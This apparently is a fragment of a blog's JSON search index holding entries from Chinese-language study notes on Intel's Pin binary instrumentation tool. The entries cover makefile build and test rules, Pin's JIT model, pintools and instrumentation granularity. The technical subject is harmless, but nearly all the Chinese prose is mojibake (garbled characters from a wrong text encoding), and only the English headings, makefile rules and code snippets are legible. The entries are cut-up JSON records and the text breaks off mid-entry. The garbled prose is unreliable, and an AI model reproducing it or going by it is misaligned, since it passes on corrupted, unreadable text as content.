ä¸‹é¢ä»‹ç»å¦‚ä½•é€šè¿‡makefileæ„å»ºäºŒè¿›åˆ¶ç¨‹åºå¹¶è¿è¡Œæµ‹è¯•ã€‚ä»¥ä¸‹æè¿°çš„å˜é‡éƒ½åœ¨makefile.rulesæ–‡ä»¶çš„\"Test targets\"éƒ¨åˆ†è¿›è¡Œæè¿°ï¼š TOOL_ROOTSï¼šå®šä¹‰å·¥å…·åç§°ï¼Œä¸å¸¦æ–‡ä»¶æ‰©å±•åï¼Œå…·ä½“çš„æ–‡ä»¶æ‰©å±•åå°†ç”±makeè‡ªåŠ¨æ·»åŠ ï¼Œä¾‹å¦‚YourTools.soï¼› APP_ROOTSï¼šå®šä¹‰åº”ç”¨ç¨‹åºï¼Œä¸å¸¦æ–‡ä»¶æ‰©å±•åï¼Œå…·ä½“çš„æ–‡ä»¶æ‰©å±•åå°†ç”±makeè‡ªåŠ¨æ·»åŠ ï¼Œä¾‹å¦‚YourApp.exeï¼› TEST_ROOTSï¼šå®šä¹‰æµ‹è¯•ï¼Œä¸è¦åŠ .teståç¼€ï¼Œmakeä¼šè‡ªåŠ¨æ·»åŠ ï¼Œä¾‹å¦‚YourTest.testã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:3","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.4 Defining Build Rules for Tools and Applications é»˜è®¤ä½¿ç”¨çš„æ„å»ºè§„åˆ™æ˜¯source/tools/Config/makefile.default.rulesï¼Œè¾“å…¥ä¸ºå•ä¸€çš„c/cppæ–‡ä»¶ï¼Œç”Ÿæˆç›¸åŒåå­—çš„äºŒè¿›åˆ¶ç¨‹åºã€‚å¦‚æœè¾“å…¥ä¸ºå¤šä¸ªæºæ–‡ä»¶ï¼Œä¸”éœ€è¦è‡ªå®šä¹‰æ„å»ºè§„åˆ™ï¼Œå¯ä»¥åœ¨make.rulesæ–‡ä»¶çš„\"Build rules\"éƒ¨åˆ†çš„æœ«å°¾æ·»åŠ ã€‚å¦‚ä¸‹æ˜¯è§„åˆ™ä¾‹å­ï¼š æ„å»ºå•ä¸€æºæ–‡ä»¶ä¸”ä¸è¿›è¡Œä¼˜åŒ–ï¼š # Build the intermediate object file. $(OBJDIR)YourTool$(OBJ_SUFFIX): YourTool.cpp $(CXX) $(TOOL_CXXFLAGS_NOOPT) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)YourTool$(OBJ_SUFFIX) $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $\u003c $(TOOL_LPATHS) $(TOOL_LIBS) æ„å»ºå¤šæºæ–‡ä»¶ä¸”è¿›è¡Œä¼˜åŒ–ï¼š # Build the intermediate object file. $(OBJDIR)Source1$(OBJ_SUFFIX): Source1.cpp $(CXX) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the intermediate object file. $(OBJDIR)Source2$(OBJ_SUFFIX): Source2.c Source2.h $(CC) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)Source1$(OBJ_SUFFIX) $(OBJDIR)Source2$(OBJ_SUFFIX) Source2.h $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $(^:%.h=) $(TOOL_LPATHS) $(TOOL_LIBS) ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:4","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.5 Defining Test Recipes in makefile.rules åœ¨\"Test recipes\"éƒ¨åˆ†è‡ªå®šä¹‰è‡ªå·±çš„æµ‹è¯•éœ€æ±‚ï¼Œä¾‹å¦‚ï¼š YourTest.test: $(OBJDIR)YourTool$(PINTOOL_SUFFIX) $(OBJDIR)YourApp$(EXE_SUFFIX) $(PIN) -t $\u003c -- $(OBJDIR)YourApp$(EXE_SUFFIX) ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:5","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.6 Useful make Variables and Flags æ‘˜å–makefile.configä¸­å‡ ä¸ªé‡ç‚¹çš„æ ‡å¿—è¿›è¡Œè¯´æ˜ï¼š IN_ROOTï¼šåœ¨å¥—ä»¶å¤–æ„å»ºå·¥å…·æ—¶æŒ‡å®šPinå¥—ä»¶çš„ä½ç½®ã€‚ CC: æŒ‡å®šå·¥å…·çš„é»˜è®¤cç¼–è¯‘å™¨ã€‚ CXXï¼šæŒ‡å®šå·¥å…·çš„é»˜è®¤c++ç¼–è¯‘å™¨ APP_CCï¼šæŒ‡å®šåº”ç”¨ç¨‹åºçš„é»˜è®¤ c ç¼–è¯‘å™¨ã€‚å¦‚æœæœªå®šä¹‰ï¼ŒAPP_CC å°†ä¸ CC ç›¸åŒã€‚ APP_CXXï¼šæŒ‡å®šåº”ç”¨ç¨‹åºçš„é»˜è®¤ c++ ç¼–è¯‘å™¨ã€‚å¦‚æœæœªå®šä¹‰ï¼ŒAPP_CXX å°†ä¸ CXX ç›¸åŒã€‚ TARGETï¼šæŒ‡å®šé»˜è®¤ç›®æ ‡æ¶æ„ï¼Œä¾‹å¦‚äº¤å‰ç¼–è¯‘ã€‚ ICC: ä½¿ç”¨è‹±ç‰¹å°”ç¼–è¯‘å™¨æ„å»ºå·¥å…·æ—¶æŒ‡å®š ICC=1ã€‚ DEBUG: å½“æŒ‡å®š DEBUG=1 æ—¶ï¼Œåœ¨æ„å»ºå·¥å…·å’Œåº”ç”¨ç¨‹åºæ—¶ä¼šç”Ÿæˆè°ƒè¯•ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œä¸ä¼šæ‰§è¡Œä»»ä½•ç¼–è¯‘å’Œ/æˆ–é“¾æ¥ä¼˜åŒ–ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:6","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"Pinå­¦ä¹ è®°å½•ç¬¬ä¸€ç¯‡","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯Pinç³»åˆ—å­¦ä¹ è®°å½•çš„ç¬¬ä¸€ç¯‡ï¼Œä¸»è¦æ˜¯å®˜æ–¹æ–‡æ¡£çš„ç›¸å…³å†…å®¹çš„æ•´ç†æ€»ç»“ã€‚ Pin version: 3.20 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:0:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"1. Introduction Pin æ˜¯ä¸€ä¸ªåŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©å·¥å…·ï¼Œæ”¯æŒ Linux*ï¼Œ macOS* å’Œ Windows* æ“ä½œç³»ç»Ÿä»¥åŠå¯æ‰§è¡Œç¨‹åºã€‚Pinå¯ä»¥é€šè¿‡pintoolsåœ¨ç¨‹åºè¿è¡ŒæœŸé—´åŠ¨æ€åœ°å‘å¯æ‰§è¡Œæ–‡ä»¶çš„ä»»æ„ä½ç½®æ’å…¥ä»»æ„ä»£ç ï¼ˆC/C++ï¼‰ï¼Œä¹Ÿå¯ä»¥attachåˆ°ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚ Pin æä¾›äº†ä¸°å¯Œçš„ APIï¼Œå¯ä»¥æŠ½è±¡å‡ºåº•å±‚æŒ‡ä»¤é›†ç‰¹æ€§ï¼Œå¹¶å…è®¸å°†è¿›ç¨‹çš„å¯„å­˜å™¨æ•°æ®ç­‰çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™æ³¨å…¥çš„ä»£ç ã€‚Pinä¼šè‡ªåŠ¨å­˜å‚¨å’Œé‡ç½®è¢«æ³¨å…¥ä»£ç è¦†ç›–çš„å¯„å­˜å™¨ï¼Œä»¥æ¢å¤ç¨‹åºçš„ç»§ç»­è¿è¡Œã€‚å¯¹ç¬¦å·å’Œè°ƒè¯•ä¿¡æ¯ä¹Ÿå¯ä»¥è®¾ç½®è®¿é—®æƒé™ã€‚ Pinå†…ç½®äº†å¤§é‡çš„æ ·ä¾‹æ’æ¡©å·¥å…·çš„æºç ï¼ŒåŒ…æ‹¬åŸºæœ¬å—åˆ†æå…¶ã€ç¼“å­˜æ¨¡æ‹Ÿå™¨ã€æŒ‡ä»¤è·Ÿè¸ªç”Ÿæˆå™¨ç­‰ï¼Œæ ¹æ®è‡ªå·±çš„å®é™…éœ€æ±‚è¿›è¡Œè‡ªå®šä¹‰å¼€å‘ä¹Ÿååˆ†æ–¹ä¾¿ã€‚ ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"2. Instrument with Pin ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"1. Pin å¯¹ Pin çš„ä¸€ä¸ªæœ€åˆé€‚çš„ç†è§£æ˜¯å¯ä»¥å°† Pin å½“ä½œä¸€ä¸ª JIT ç¼–è¯‘å™¨ï¼Œåªæ˜¯å®ƒçš„è¾“å…¥ä¸æ˜¯å­—èŠ‚ç ï¼Œè€Œæ˜¯å¯æ‰§è¡Œæ–‡ä»¶ã€‚Pin ä¼šæ‹¦æˆªå¯æ‰§è¡Œæ–‡ä»¶çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œç„¶åå¯¹ä»è¯¥æŒ‡ä»¤å¼€å§‹çš„åç»­çš„æŒ‡ä»¤åºåˆ—é‡æ–°â€œcompileâ€æ–°çš„ä»£ç ï¼Œç„¶åæ§åˆ¶æƒé™è½¬ç§»åˆ°æ–°ç”Ÿæˆçš„ä»£ç ã€‚ç”Ÿæˆçš„ä»£ç ä¸åŸå§‹ä»£ç å‡ ä¹ä¸€è‡´ï¼Œä½†æ˜¯ Pin ä¼šä¿è¯åœ¨åˆ†æ”¯é€€å‡ºä»£ç åºåˆ—æ—¶é‡æ–°è·å¾—æ§åˆ¶æƒé™ã€‚é‡æ–°è·å¾—æ§åˆ¶æƒåï¼ŒPin ä¼šåŸºäºåˆ†æ”¯ç”Ÿæˆæ›´å¤šçš„ä»£ç ï¼Œç„¶åç»§ç»­è¿è¡Œã€‚Pin å°†æ‰€æœ‰ç”Ÿæˆçš„ä»£ç éƒ½ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè¿™æ ·å¯ä»¥å®ç°ä»£ç é‡ç”¨ã€‚ åœ¨è¿™ç§ JIT æ¨¡å¼ä¸‹ï¼Œæ‰§è¡Œçš„æ˜¯ç”Ÿæˆçš„ä»£ç ï¼ŒåŸå§‹ä»£ç ä»…ä½œä¸ºå‚è€ƒã€‚å½“ç”Ÿæˆä»£ç æ—¶ï¼ŒPin ä¼šç»™åˆ°ç”¨æˆ·æ³¨å…¥è‡ªå·±æƒ³æ‰§è¡Œçš„ä»£ç ï¼ˆæ’æ¡©ï¼‰çš„æœºä¼šã€‚ Pin å¯¹æ‰€æœ‰å®é™…æ‰§è¡Œçš„ä»£ç è¿›è¡Œæ’æ¡©ï¼Œä¸ç®¡ä»£ç å…·ä½“å¤„äºå“ªä¸ª section ã€‚è™½ç„¶å¯¹äºä¸€äº›æ¡ä»¶åˆ†æ”¯ä¼šå­˜åœ¨å¼‚å¸¸ï¼Œä½†æ˜¯å¦‚æœæŒ‡ä»¤æ²¡æœ‰è¢«æ‰§è¡Œè¿‡ï¼Œå°±ä¸€å®šä¸ä¼šè¢«æ’æ¡©ã€‚ ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"2. Pintools åœ¨æ¦‚å¿µä¸Šï¼Œæ’æ¡©ä¸»è¦åŒ…å«ä¸¤éƒ¨åˆ†å†…å®¹ï¼š æ’æ¡©æœºåˆ¶ï¼ˆinstrumentation codeï¼‰ åœ¨ä»€ä¹ˆä½ç½®æ’å…¥ä»€ä¹ˆæ ·çš„ä»£ç  åˆ†æä»£ç ï¼ˆanalysis codeï¼‰ åœ¨æ’æ¡©ç‚¹æ‰§è¡Œçš„ä»£ç  è¿™ä¸¤éƒ¨åˆ†å†…å®¹éƒ½é€šè¿‡ Pintool è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ¥å®ç°ã€‚Pintool å¯ä»¥çœ‹ä½œæ˜¯ Pin ä¸­å¯ä»¥å®ç°ä¿®æ”¹ä»£ç ç”Ÿæˆè¿‡ç¨‹çš„æ’ä»¶ã€‚ Pintool ä¼šå‘ Pin æ³¨å†Œæ’æ¡©å›è°ƒä¾‹ç¨‹ï¼Œæ¯å½“éœ€è¦ç”Ÿæˆæ–°ä»£ç æ—¶ï¼Œ Pin ä¼šè°ƒç”¨è¿™äº›å›è°ƒä¾‹ç¨‹ã€‚å›è°ƒä¾‹ç¨‹æ‰¿æ‹…äº†æ£€æµ‹æ’æ¡©å†…å®¹çš„ä½œç”¨ï¼Œå®ƒä¼šæ£€æŸ¥è¦ç”Ÿæˆçš„ä»£ç ï¼Œæ£€æŸ¥å…¶é™æ€å±æ€§ï¼Œå¹¶å†³å®šæ˜¯å¦ä»¥åŠåœ¨ä½•å¤„æ³¨å…¥å¯¹åˆ†æå‡½æ•°çš„è°ƒç”¨ã€‚ åˆ†æåŠŸèƒ½æ”¶é›†æœ‰å…³åº”ç”¨ç¨‹åºçš„æ•°æ®ã€‚Pin ç¡®ä¿æ ¹æ®éœ€è¦ä¿å­˜å’Œæ¢å¤æ•´æ•°å’Œæµ®ç‚¹å¯„å­˜å™¨çŠ¶æ€ï¼Œå¹¶å…è®¸å°†å‚æ•°ä¼ é€’ç»™å‡½æ•°ã€‚ Pintool è¿˜å¯ä»¥ä¸ºè¯¸å¦‚çº¿ç¨‹åˆ›å»ºæˆ– fork ä¹‹ç±»çš„äº‹ä»¶æ³¨å†Œé€šçŸ¥å›è°ƒä¾‹ç¨‹ï¼Œè¿™äº›å›è°ƒé€šå¸¸ç”¨äºæ”¶é›†æ•°æ®æˆ–å·¥å…·åˆå§‹åŒ–å’Œæ¸…ç†ã€‚ å› ä¸º Pintool é‡‡ç”¨çš„æ˜¯ç±»ä¼¼æ’ä»¶çš„å·¥ä½œæœºåˆ¶ï¼Œæ‰€ä»¥å¿…é¡»è¿è¡Œåœ¨å’Œ Pin åŠæ’æ¡©çš„å¯æ‰§è¡Œæ–‡ä»¶ç›¸åŒçš„åœ°å€ç©ºé—´å†…ï¼Œæ‰€ä»¥ Pintool å¯ä»¥è®¿é—®å¯æ‰§è¡Œæ–‡ä»¶çš„å…¨éƒ¨æ•°æ®ï¼Œè¿˜ä¼šä¸å¯æ‰§è¡Œæ–‡ä»¶å…±äº« fd å’Œå…¶ä»–è¿›ç¨‹ä¿¡æ¯ã€‚ åœ¨ Pintool çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œåˆ†æä»£ç çš„è°ƒä¼˜æ¯”æ’æ¡©ä»£ç æ›´é‡è¦ï¼Œå› ä¸ºæ’æ¡©ä»£ç åªæ‰§è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯åˆ†æä»£ç ä¼šè°ƒç”¨å¾ˆå¤šæ¬¡ã€‚ ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"3. Instrumentation Granularity 1. trace instrumentation åœ¨ä¸€ä¸ªä»£ç åºåˆ—ç¬¬ä¸€æ¬¡æ‰§è¡Œå‰è¿›è¡Œæ’æ¡©ï¼Œè¿™ç§ç²’åº¦çš„æ’æ¡©ç§°ä¸ºâ€œtrace instrumentationâ€ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒPintool ä¸€æ¬¡â€œtraceâ€æ‰§è¡Œä¸€æ¬¡æ£€æŸ¥å’Œæ’æ¡©ï¼Œâ€œtraceâ€æ˜¯æŒ‡ä»ä¸€ä¸ª branch å¼€å§‹ï¼Œä»¥ä¸€ä¸ªæ— æ¡ä»¶è·³è½¬ branch ç»“æŸï¼ŒåŒ…å« call å’Œ returnã€‚ Pin ä¼šä¿è¯æ¯ä¸ª trace åªæœ‰ä¸€ä¸ªé¡¶éƒ¨å…¥å£ï¼Œä½†æ˜¯å¯èƒ½åŒ…å«å¤šä¸ªå‡ºå£ã€‚å¦‚æœä¸€ä¸ªåˆ†æ”¯è¿æ¥åˆ°äº†ä¸€ä¸ª trace çš„ä¸­é—´ä½ç½®ï¼ŒPin ä¼šç”Ÿæˆä¸€ä¸ªä»¥è¯¥åˆ†æ”¯ä½œä¸ºå¼€å§‹çš„æ–°çš„ trace ã€‚Pin å°† trace åˆ‡åˆ†æˆäº†åŸºæœ¬å—ï¼Œæ¯ä¸ªåŸºæœ¬å—ç§°ä¸ºâ€œBBLâ€ï¼Œæ¯ä¸ª BBL æ˜¯ä¸€ä¸ªå•ä¸€å…¥å£ã€å•ä¸€å‡ºå£çš„æŒ‡ä»¤åºåˆ—ã€‚å¦‚æœæœ‰åˆ†æ”¯è¿æ¥åˆ°äº† BBL çš„ä¸­é—´ä½ç½®ï¼Œä¼šå®šä¹‰ä¸€ä¸ªæ–°çš„ BBL ã€‚é€šå¸¸ä»¥ BBL ä¸ºå•ä½æ’å…¥åˆ†æè°ƒç”¨ï¼Œè€Œä¸æ˜¯å¯¹æ¯ä¸ªæŒ‡ä»¤éƒ½æ’å…¥ï¼Œè¿™æ ·å¯ä»¥é™ä½åˆ†æè°ƒç”¨çš„æ€§èƒ½æ¶ˆè€—ã€‚trace instrumentation é€šè¿‡ TRACE_AddInstrumentFunction API è°ƒç”¨ã€‚ å› ä¸º Pin æ˜¯åœ¨ç¨‹åºæ‰§è¡Œæ—¶åŠ¨æ€å‘ç°ç¨‹åºçš„æ‰§è¡Œæµï¼Œæ‰€ä»¥ BBL çš„æ¦‚å¿µä¸ä¼ ç»Ÿçš„åŸºæœ¬å—çš„æ¦‚å¿µæœ‰æ‰€ä¸åŒï¼Œè¯´æ˜å¦‚ä¸‹ï¼š swtich(i){ case 4: total++; case 3: total++; case 2: total++; case 1: total++; case 0: default: break; } åœ¨ IA-32 æ¶æ„ä¸‹ï¼Œä¼šç”Ÿæˆå¦‚ä¸‹ç±»ä¼¼çš„æŒ‡ä»¤ï¼š .L7: addl $1, -4(%ebp) .L6: addl $1, -4(%ebp) .L5: addl $1, -4(%ebp) .L4: addl $1, -4(%ebp) ä¼ ç»ŸåŸºæœ¬å—çš„è®¡ç®—æ–¹å¼æ˜¯ä¼šæŠŠæ¯ä¸ª addl æŒ‡ä»¤ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„æŒ‡ä»¤åŸºæœ¬å—ï¼Œä½†æ˜¯å¯¹äº Pin æ¥è¯´ï¼Œéšç€æ‰§è¡Œä¸åŒçš„ switch casesï¼ŒPin ä¼šåœ¨ .L7 ä½œä¸ºå…¥å£ï¼ˆä» .L7 ä¾æ¬¡å‘ä¸‹æ‰§è¡Œï¼‰çš„æ—¶å€™ç”ŸæˆåŒ…å«æ‰€æœ‰4ä¸ªæŒ‡ä»¤çš„ BBLï¼Œåœ¨ .L6 è¾“å…¥çš„æ—¶å€™ç”ŸæˆåŒ…å«3ä¸ªæŒ‡ä»¤çš„ BBLï¼Œä¾æ­¤ç±»æ¨ã€‚æ‰€ä»¥ï¼Œåœ¨ Pin çš„ç»Ÿè®¡æ–¹å¼é‡Œï¼Œå¦‚æœä»£ç åˆ†æ”¯èµ°åˆ°äº† .L7 ï¼Œåªä¼šè®¡ç®—ä¸€ä¸ª Pin BBLï¼Œä½†æ˜¯4ä¸ªä¼ ç»Ÿæ¦‚å¿µä¸Šçš„åŸºæœ¬å—éƒ½è¢«æ‰§è¡Œäº†ã€‚ Pin åœ¨é‡åˆ°ä¸€äº›ç‰¹æ®ŠæŒ‡ä»¤çš„æ—¶å€™ä¼šç›´æ¥ä½œä¸º trace çš„ç»“æŸä½ç½®ï¼Œç”Ÿæˆä¸€ä¸ª BBLï¼Œ æ¯”å¦‚ cpuid, popf ä»¥åŠ REP ä¸ºå‰ç¼€çš„æŒ‡ä»¤ã€‚REP ä¸ºå‰ç¼€çš„æŒ‡ä»¤éƒ½è¢«å½“ä½œéšå¼å¾ªç¯å¤„ç†ï¼Œåœ¨å¤„ç†å®Œç¬¬ä¸€æ¬¡çš„è¿­ä»£åï¼Œåé¢çš„æ¯æ¬¡è¿­ä»£éƒ½ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ BBL ï¼Œå› æ­¤è¿™ç§æƒ…å†µä¸‹ï¼Œä¼šçœ‹åˆ°æ¯”ä¼ ç»ŸåŸºæœ¬å—ç»Ÿè®¡æ–¹å¼ç»Ÿè®¡å‡ºæ›´å¤šçš„ BBLã€‚ 2. instruction instrumentation Pintool ä¼šåœ¨å¯æ‰§è¡Œæ–‡ä»¶çš„æ¯æ¡æŒ‡ä»¤éƒ½è¿›è¡Œæ’æ¡©ï¼Œè¿™ç§æ¨¡å¼ä½¿å¾—å¼€å‘è€…ä¸å¿…è¿‡å¤šå…³æ³¨ trace å†…éƒ¨çš„è¿­ä»£å¾ªç¯æŒ‡ä»¤ï¼Œå› ä¸ºå¦‚ä¸Šé¢æ‰€è¯´ï¼ŒåŒ…å«å¾ªç¯çš„ trace å†…éƒ¨çš„ç‰¹å®šçš„ BBL å’ŒæŒ‡ä»¤å¯èƒ½äº§ç”Ÿå¤šæ¬¡ã€‚instruction instrumentation é€šè¿‡ INS_AddInstrumentFunction API è¿›è¡Œè°ƒç”¨ã€‚ 3. image instrumentation é€šè¿‡â€œcachingâ€æ’æ¡©è¯·æ±‚å®ç°ï¼Œä¼šæœ‰é¢å¤–çš„å†…å­˜ç©ºé—´è¦æ±‚ï¼Œå±äºä¸€ç§â€œæå‰æ’æ¡©â€ã€‚image instrumentation æ¨¡å¼ä¸‹ï¼ŒPintool åœ¨ IMG:Image Objectç¬¬ä¸€æ¬¡åŠ è½½æ—¶ï¼Œå¯¹æ•´ä¸ª imgaes è¿›è¡Œæ£€æŸ¥å’Œæ’æ¡©ï¼Œ Pintool å¯ä»¥éå† image çš„ sectionsï¼šSEC:Section Objectï¼Œ å¯ä»¥æ˜¯ section ä¸­çš„ routineï¼šRTN:Routineï¼Œè¿˜å¯ä»¥æ˜¯ä¸€ä¸ª routine ä¸­çš„ instructionsï¼šINSã€‚æ’å…¥ä½ç½®å¯ä»¥æ˜¯ä¾‹ç¨‹æˆ–æŒ‡ä»¤çš„å‰é¢æˆ–åé¢ï¼Œéƒ½å¯ä»¥å®ç°ï¼Œä½¿ç”¨çš„ API ä¸º IMG_AddInstrumentFunction ã€‚ image instrumentation éœ€è¦æœ‰è°ƒè¯•ä¿¡æ¯æ¥ç¡®å®š routine çš„è¾¹ç•Œï¼Œæ‰€ä»¥åœ¨è°ƒç”¨ PIN_Init ä¹‹å‰ï¼Œéœ€è¦å…ˆåˆå§‹åŒ–ç¬¦å·ä¿¡æ¯ PIN_InitSysmbolsã€‚ 4. routine instrumentation é€šè¿‡â€œcachingâ€æ’æ¡©è¯·æ±‚å®ç°ï¼Œä¼šæœ‰é¢å¤–çš„å†…å­˜ç©ºé—´è¦æ±‚ï¼Œå±äºä¸€ç§â€œæå‰æ’æ¡©â€ã€‚routine instrumentation æ¨¡å¼ä¸‹ï¼ŒPintool åœ¨ image é¦–æ¬¡åŠ è½½æ—¶å°±å¯¹æ•´ä¸ª routine è¿›è¡Œæ£€æŸ¥å’Œæ’æ¡©ï¼Œå¯¹ routine ä¸­çš„æ¯æ¡æŒ‡ä»¤éƒ½å¯ä»¥æ’æ¡©ï¼Œä½†æ˜¯æ²¡æœ‰å……åˆ†çš„ä¿¡æ¯å¯ä»¥å°†æŒ‡ä»¤åˆ’åˆ†ä¸º BBLã€‚æ’å…¥ä½ç½®å¯ä»¥æ˜¯æ‰§è¡Œä¾‹ç¨‹æˆ–æŒ‡ä»¤çš„å‰åã€‚è¿™ç§æ¨¡å¼å…¶å®æ›´å¤§ç¨‹åº¦ä¸Šå±äº image instrumentation çš„æ›¿ä»£æ–¹æ³•ï¼Œä½¿ç”¨çš„ API ä¸º RTN_AddInstrumentFunctionã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ image å’Œ routine instrumentation æ¨¡å¼ä¸‹ï¼Œæ’æ¡©æ—¶å¹¶ä¸ç¡®å®š routine æ˜¯å¦ä¼šè¢«æ‰§è¡Œï¼Œä½†æ˜¯é€šè¿‡è¯†åˆ« routine çš„å¼€å§‹æŒ‡ä»¤ï¼Œå¯ä»¥éå†å‡ºæ‰§è¡Œè¿‡çš„ routine çš„æŒ‡ä»¤ã€‚ ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:3","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"4. Symbols Pin é€šè¿‡symbol object æ¥è®¿é—®å‡½æ•°åï¼Œ ä½†æ˜¯ symbol å¯¹è±¡åªèƒ½æä¾›ç¨‹åºä¸­çš„å‡½æ•°ç¬¦å·ç›¸å…³çš„ä¿¡æ¯ï¼Œå¯¹äºæ•°æ®ç¬¦å·ä¹‹ç±»çš„ä¿¡æ¯å¿…é¡»é€šè¿‡å…¶ä»–å·¥å…·è·å–ã€‚ Windowsä¸‹ï¼Œå¯ä»¥é€šè¿‡ dbghelp.dll æ–‡ä»¶è·å–ï¼Œä½†æ˜¯å¯èƒ½å‡ºç°æ­»é”é—®é¢˜ï¼›Linuxä¸‹å¯ä»¥é€šè¿‡ libelf.so æˆ– libdwarf.so æ–‡ä»¶è·å–ç¬¦å·ä¿¡æ¯ã€‚ ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:4","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"3. Examples æœ¬ç« 